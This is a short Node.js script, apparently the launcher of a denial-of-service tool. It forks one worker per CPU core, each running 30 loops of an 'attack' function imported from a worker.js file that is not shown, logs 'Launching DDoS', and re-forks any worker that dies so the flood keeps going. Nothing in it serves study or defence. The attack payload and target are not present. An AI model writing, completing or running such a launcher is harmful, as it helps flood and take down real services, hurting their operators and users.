import cluster from "cluster";
import os from "os";

const CORES = os.cpus().length;       
const LOOPS_PER_WORKER = 30;           

if (cluster.isPrimary) {
    console.log(`Launching DDoS: ${CORES} processes × ${LOOPS_PER_WORKER} loops = ${CORES * LOOPS_PER_WORKER} concurrent requests`);

    for (let i = 0; i < CORES; i++) {
        cluster.fork({ BOT_ID: i }); 
    }

    cluster.on("exit", (worker) => {
        console.log(`Worker ${worker.process.pid} died, reforking...`);
        cluster.fork();               
    });

} else {
        import("./worker.js").then(({ default: attack }) => {
        attack(Number(process.env.BOT_ID), LOOPS_PER_WORKER);
    });
}